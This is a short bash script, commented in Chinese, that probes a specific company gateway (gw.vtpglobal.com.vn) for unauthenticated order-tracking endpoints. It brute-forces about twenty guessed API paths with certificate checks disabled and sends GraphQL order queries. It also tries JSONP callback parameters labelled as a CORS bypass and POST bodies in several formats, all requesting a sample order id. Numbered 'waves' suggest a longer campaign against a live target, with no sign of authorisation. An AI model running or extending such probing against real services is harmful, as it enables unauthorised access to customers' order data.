#!/bin/bash
# 订单查询深度扫描 - 查找可能的公开端点

BASE="https://gw.vtpglobal.com.vn"

echo "[🔥] 第8波：深度路径爆破"
# 8. 深度路径扫描
PATHS=(
  "/public/api/tracking"
  "/api/public/tracking"
  "/api/external/tracking"
  "/external/api/tracking"
  "/open/api/tracking"
  "/api/open/tracking"
  "/guest/api/tracking"
  "/api/guest/tracking"
  "/api/v1/public/order"
  "/api/v1/tracking/query"
  "/api/v1/query/order"
  "/api/tracking"
  "/tracking/api"
  "/api/order/query"
  "/query/order"
  "/v1/tracking"
  "/v1/order"
  "/web/tracking"
  "/mobile/tracking"
  "/app/tracking"
)

for path in "${PATHS[@]}"; do
  echo "[+] $path"
  curl -sk "$BASE$path?id=1000001" -w "\nHTTP: %{http_code}\n" -m 3 2>/dev/null | head -5
done

echo ""
echo "[🔥] 第9波：GraphQL查询"
# 9. GraphQL订单查询
curl -sk "$BASE/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ order(id: \"1000001\") { id status } }"}' \
  -w "\nHTTP: %{http_code}\n" | head -10

curl -sk "$BASE/api/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ orderTracking(code: \"1000001\") { trackingNo status } }"}' \
  -w "\nHTTP: %{http_code}\n" | head -10

echo ""
echo "[🔥] 第10波：JSONP/CORS绕过"
# 10. JSONP callback
curl -sk "$BASE/api/v1/order-tracking?id=1000001&callback=getData" \
  -w "\nHTTP: %{http_code}\n" | head -10

curl -sk "$BASE/api/v1/order-tracking?id=1000001&jsonp=getData" \
  -w "\nHTTP: %{http_code}\n" | head -10

echo ""
echo "[🔥] 第11波：POST body测试"
# 11. POST body多种格式
echo "[+] JSON格式"
curl -sk "$BASE/api/v1/order-tracking" -X POST \
  -H "Content-Type: application/json" \
  -d '{"orderNo":"1000001"}' -w "\nHTTP: %{http_code}\n" | head -10

echo "[+] Form格式"
curl -sk "$BASE/api/v1/order-tracking" -X POST \
  -d "orderNo=1000001" -w "\nHTTP: %{http_code}\n" | head -10

echo "[+] XML格式"
curl -sk "$BASE/api/v1/order-tracking" -X POST \
  -H "Content-Type: application/xml" \
  -d '<order><id>1000001</id></order>' -w "\nHTTP: %{http_code}\n" | head -10
